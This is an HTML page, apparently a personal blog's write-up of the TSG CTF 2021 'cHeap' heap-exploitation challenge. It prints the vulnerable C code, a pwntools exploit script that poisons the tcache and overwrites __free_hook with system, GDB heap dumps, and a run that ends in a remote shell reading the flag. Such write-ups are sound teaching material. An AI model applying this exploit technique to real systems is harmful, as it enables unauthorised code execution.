@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>TSG CTF 2021 - cHeap | kileak</title>
+
+
+
+
+
+<meta name="description" content="TSG CTF 2021 - cHeap">
+
+
+<meta name="keywords" content="tsg, cheap">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/tsg-cheap/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">TSG CTF 2021 - cHeap</h1>
+      <p class="post-meta">Oct 4, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>cHeap
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>cHeap a.k.a. babyheap</p>
+
+  <p>nc 34.146.101.4 30001</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/tsg21/cheap/cheap.tar.gz">cheap.tar.gz</a> <a href="https://kileak.github.io/assets/tsg21/cheap/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">1. create
+2. show
+3. remove
+Choice: </code></pre></figure>
+
+<p>cHeap was a very basic heap challenge based on libc-2.31, including tcache.</p>
+
+<p>It allows us to create one note, show it and remove it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="n">size</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"size: "</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"data: "</span><span class="p">);</span>
+    <span class="n">readn</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>       <span class="c1">// Allow oob write</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">show</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">delete</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>               <span class="c1">// UAF</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This implementation contains two major flaws. For one, the pointer to the note doesn’t get zeroed out after free, allowing us to show it again for an easy leak. And the second one is, that in <code class="language-plaintext highlighter-rouge">create</code> we’ll always be able to write <code class="language-plaintext highlighter-rouge">0x100</code> bytes into our note independent from its real size, allowing us to overwrite follow up chunk data.</p>
+
+<p>Since the size for the creation isn’t checked or restricted, this opens up the way for a lot of different solutions, depending on the leaks you can get.</p>
+
+<p>I went for just leak libc directly and overwre <code class="language-plaintext highlighter-rouge">__free_hook</code>, so all we need is a <code class="language-plaintext highlighter-rouge">libc</code> leak, then we can just overwrite the <code class="language-plaintext highlighter-rouge">FD</code> pointer of a freed chunk with it and reallocate it.</p>
+
+<p>Only tricky part for this is, that in <code class="language-plaintext highlighter-rouge">libc-2.31</code> <code class="language-plaintext highlighter-rouge">tcache</code> will check, how many chunks are currently freed and only serve the chunk from <code class="language-plaintext highlighter-rouge">tcache</code>, if the fastbin count is &gt; 0. Since we can only allocate one chunk at a time to free it, we’ll always have only one freed chunk of a specific size (but surely, there’s a way to overcome this).</p>
+
+<p>Let’s start with some heap grooming to achieve a <code class="language-plaintext highlighter-rouge">libc</code> leak. For this, I created multiple chunks from different sizes to fill up the heap, overwrote the size of a freed chunk with a fake size (with the oob write on creating a note), so it cannot be served by tcache and put a fake <code class="language-plaintext highlighter-rouge">next_size</code> at the bottom of the heap to avoid any errors on freeing this chunk later on.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.146.101.4"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30001</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./cheap"</span>
+
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"1. create"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">LEAK</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+
+    <span class="c1"># fill up heap with different sized chunks
+</span>    <span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x300</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x100</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+
+    <span class="c1"># put fake next_size in the last chunk
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">232</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3e1</span><span class="p">)</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+
+    <span class="c1"># recreate the 0x50 chunk and overwrite the size of the freed 0x300 chunk
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">)</span>
+    <span class="n">create</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+
+    <span class="c1"># # reallocate the 0x300 chunk and free it
+</span>    <span class="n">create</span><span class="p">(</span><span class="mh">0x300</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">()</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="c1"># e = ELF("./cheap")
+</span>    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./cheap"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>So, before creating the last 0x50 note to overwrite the size, the heap will look like this.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000041
+0x5555555592f0:	0x0000000000000000	0x0000555555559010
+0x555555559300:	0x0000000000000000	0x0000000000000000
+0x555555559310:	0x0000000000000000	0x0000000000000000
+0x555555559320:	0x0000000000000000	0x0000000000000051
+0x555555559330:	0x0000000000000000	0x0000555555559010  &lt;= freed 0x50 chunk
+0x555555559340:	0x0000000000000000	0x0000000000000000
+0x555555559350:	0x0000000000000000	0x0000000000000000
+0x555555559360:	0x0000000000000000	0x0000000000000000
+0x555555559370:	0x0000000000000000	0x0000000000000301
+0x555555559380:	0x0000000000000000	0x0000555555559010  &lt;= freed 0x300 chunk
+0x555555559390:	0x0000000000000000	0x0000000000000000
+0x5555555593a0:	0x0000000000000000	0x0000000000000000
+0x5555555593b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>After creating the 0x50 note (for overwriting 0x300 note size)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000041
+0x5555555592f0:	0x0000000000000000	0x0000555555559010
+0x555555559300:	0x0000000000000000	0x0000000000000000
+0x555555559310:	0x0000000000000000	0x0000000000000000
+0x555555559320:	0x0000000000000000	0x0000000000000051
+0x555555559330:	0x0000000000000000	0x0000555555559010  &lt;= freed 0x50 chunk
+0x555555559340:	0x4141414141414141	0x4141414141414141
+0x555555559350:	0x4141414141414141	0x4141414141414141
+0x555555559360:	0x4141414141414141	0x4141414141414141
+0x555555559370:	0x4141414141414141	0x0000000000000421
+0x555555559380:	0x0000000000000000	0x0000555555559010  &lt;= freed 0x300 chunk
+0x555555559390:	0x0000000000000000	0x0000000000000000
+0x5555555593a0:	0x0000000000000000	0x0000000000000000
+0x5555555593b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Since the chunk at <code class="language-plaintext highlighter-rouge">0x555555559380</code> is still in the <code class="language-plaintext highlighter-rouge">0x300</code> tcache fastbin, we can reallocate it (<code class="language-plaintext highlighter-rouge">tcache</code> will NOT update the size of it on allocation) and then <code class="language-plaintext highlighter-rouge">free</code> it, to let it be handled as an unsorted bin.</p>
+
+<p>For this, we just have to make sure, that it has a valid <code class="language-plaintext highlighter-rouge">next_size</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/10gx 0x555555559370
+0x555555559370:	0x4141414141414141	0x0000000000000421
+0x555555559380:	0x0000000000000000	0x0000555555559010  &lt;= freed 0x300 chunk
+0x555555559390:	0x0000000000000000	0x0000000000000000
+0x5555555593a0:	0x0000000000000000	0x0000000000000000
+0x5555555593b0:	0x0000000000000000	0x0000000000000000
+gef➤  x/10gx 0x555555559370+0x420
+0x555555559790:	0x4141414141414141	0x00000000000003e1  &lt;= next size
+0x5555555597a0:	0x0000000000000000	0x0000000000000000
+0x5555555597b0:	0x0000000000000000	0x0000000000000000
+0x5555555597c0:	0x0000000000000000	0x0000000000000000
+0x5555555597d0:	0x0000000000000000	0x0000000000000000
+gef➤  x/10gx 0x555555559370+0x420+0x3e0
+0x555555559b70:	0x0000000000000000	0x0000000000020491  &lt;= top
+0x555555559b80:	0x0000000000000000	0x0000000000000000
+0x555555559b90:	0x0000000000000000	0x0000000000000000
+0x555555559ba0:	0x0000000000000000	0x0000000000000000
+0x555555559bb0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>With these constraints fulfilled, we can now reallocate a <code class="language-plaintext highlighter-rouge">0x300</code> chunk and free it</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000041
+0x5555555592f0:	0x0000000000000000	0x0000555555559010
+0x555555559300:	0x0000000000000000	0x0000000000000000
+0x555555559310:	0x0000000000000000	0x0000000000000000
+0x555555559320:	0x0000000000000000	0x0000000000000051
+0x555555559330:	0x0000000000000000	0x0000555555559010
+0x555555559340:	0x4141414141414141	0x4141414141414141
+0x555555559350:	0x4141414141414141	0x4141414141414141
+0x555555559360:	0x4141414141414141	0x4141414141414141
+0x555555559370:	0x4141414141414141	0x0000000000000421
+0x555555559380:	0x00007ffff7fb8be0	0x00007ffff7fb8be0  &lt;= realllocated/freed current note
+0x555555559390:	0x0000000000000000	0x0000000000000000
+0x5555555593a0:	0x0000000000000000	0x0000000000000000
+0x5555555593b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>So, now we have the current UAF note pointing to the freed unsorted bin chunk, and can just leak a <code class="language-plaintext highlighter-rouge">main_arena</code> pointer from it via <code class="language-plaintext highlighter-rouge">show</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/media/sf_ctf/tsg/cheap/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './cheap': pid 20677
+[20677]
+[*] Paused (press any to continue)
+[*] LEAK     : 0x7ffff7fb8be0
+[*] LIBC     : 0x7ffff7dcd000
+[*] Switching to interactive mode</code></pre></figure>
+
+<p>Knowing libc base address, we can now go on with overwriting <code class="language-plaintext highlighter-rouge">__free_hook</code>, but as said in the beginning, we’re only allowed to create and free one note at a time, but we need at least two freed chunks in a <code class="language-plaintext highlighter-rouge">tcache</code> fastbin to overwrite the <code class="language-plaintext highlighter-rouge">FD</code> pointer of a freed chunk and reallocating it.</p>
+
+<p>But since we have the oob write, we can just corrupt the sizes of two existing chunks (similar to what we did for leaking libc) and free them, so they get freed into the same <code class="language-plaintext highlighter-rouge">tcache</code> fastbin.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create two fake 0x50 chunks
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="c1"># allocate 0x20 chunk to overwrite follow up chunk sizes
+</span><span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x0000000000000021
+0x5555555592a0:	0x0000000000000000	0x0000555555559010 &lt;= 0x20 chunk
+0x5555555592b0:	0x0000000000000000	0x0000000000000051
+0x5555555592c0:	0x4242424242424242	0x4242424242424242 &lt;= freed 0x30 chunk (fake 0x50 size)
+0x5555555592d0:	0x4242424242424242	0x4242424242424242
+0x5555555592e0:	0x0000000000000000	0x0000000000000051
+0x5555555592f0:	0x0000000000000000	0x0000555555559010 &lt;= freed 0x40 chunk (fake 0x50 size)
+0x555555559300:	0x0000000000000000	0x0000000000000000
+0x555555559310:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Again, we can now allocate a <code class="language-plaintext highlighter-rouge">0x40</code> chunk, free it (will be put into <code class="language-plaintext highlighter-rouge">0x50 tcache fastbin</code>) and then allocate a <code class="language-plaintext highlighter-rouge">0x30</code> chunk and free it (which will also be put into <code class="language-plaintext highlighter-rouge">0x50 tcache fastbin</code>).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559290:	0x0000000000000000	0x0000000000000021
+0x5555555592a0:	0x0000000000000000	0x0000555555559010 &lt;= freed 0x20 chunk
+0x5555555592b0:	0x0000000000000000	0x0000000000000051
+0x5555555592c0:	0x00005555555592f0	0x0000555555559010 &lt;= freed 0x50 chunk
+0x5555555592d0:	0x4242424242424242	0x4242424242424242
+0x5555555592e0:	0x0000000000000000	0x0000000000000051
+0x5555555592f0:	0x0000555555559330	0x0000555555559010 &lt;= freed 0x50 chunk
+0x555555559300:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Using the oob write again on creating a <code class="language-plaintext highlighter-rouge">0x20</code> chunk, we can now overwrite the <code class="language-plaintext highlighter-rouge">FD</code> of the next <code class="language-plaintext highlighter-rouge">0x50</code> chunk, reallocate it and overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite FD of free 0x50 chunk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># allocate chunk to pull free_hook address into tcache arena
+</span><span class="n">create</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># overwrite __free_hook-0x10 with /bin/sh and the hook itself with system
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">After overwriting 0x50 FD
+
+0x555555559280:	0x0000555555559780	0x0000000000000000
+0x555555559290:	0x0000000000000000	0x0000000000000021
+0x5555555592a0:	0x0000000000000000	0x0000555555559010
+0x5555555592b0:	0x0000000000000000	0x0000000000000051
+0x5555555592c0:	0x00007ffff7fbbb18	0x0000555555559000
+0x5555555592d0:	0x4242424242424242	0x4242424242424242
+
+tcache arena after allocating first 0x50 chunk
+
+0x555555559000:	0x0000000000000000	0x0000000000000291
+0x555555559010:	0x0002000000000001	0x0000000000000000
+0x555555559020:	0x0000000000000000	0x0000000100000000
+0x555555559030:	0x0000000000000000	0x0000000000000000
+0x555555559040:	0x0000000000000000	0x0000000000000000
+0x555555559050:	0x0000000000000000	0x0000000000000000
+0x555555559060:	0x0000000000000000	0x0000000000000000
+0x555555559070:	0x0000000000000000	0x0000000000000000
+0x555555559080:	0x0000000000000000	0x0000000100000000
+0x555555559090:	0x00005555555592a0	0x4242424242424242
+0x5555555590a0:	0x0000000000000000	0x00007ffff7fbbb18  &lt;= 0x50 pointing to __free_hook - 0x10
+0x5555555590b0:	0x0000000000000000	0x0000000000000000
+
+after allocating second 0x50 chunk
+
+0x7ffff7fbbb18 &lt;__attr_list_lock&gt;:      0x0068732f6e69622f	0x0000000000000000  &lt;= /bin/sh string
+0x7ffff7fbbb28 &lt;__free_hook&gt;:           0x00007ffff7e22410	0x0000000000000000  &lt;= system
+0x7ffff7fbbb38 &lt;next_to_use.12460&gt;:     0x0000000000000000	0x0000000000000000
+0x7ffff7fbbb48 &lt;using_malloc_checking&gt;: 0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>So, our current note now points to <code class="language-plaintext highlighter-rouge">/bin/sh</code> string and <code class="language-plaintext highlighter-rouge">__free_hook</code> is overwritten with <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p>Freeing the current note will now trigger <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> giving us our shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/media/sf_ctf/tsg/cheap_work/cheap/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 34.146.101.4 on port 30001: Done
+[*] LEAK     : 0x7f1449acabe0
+[*] LIBC     : 0x7f14498df000
+[*] Switching to interactive mode
+$ ls
+cheap
+flag
+libc.so.6
+start.sh
+$ cat flag
+TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=TSG CTF 2021 - cHeap&amp;url=https://kileak.github.io/ctf/2021/tsg-cheap/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/tsg-cheap/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/tsg-cheap';
+        var disqus_title = 'TSG CTF 2021 - cHeap';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/tsg-cheap';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
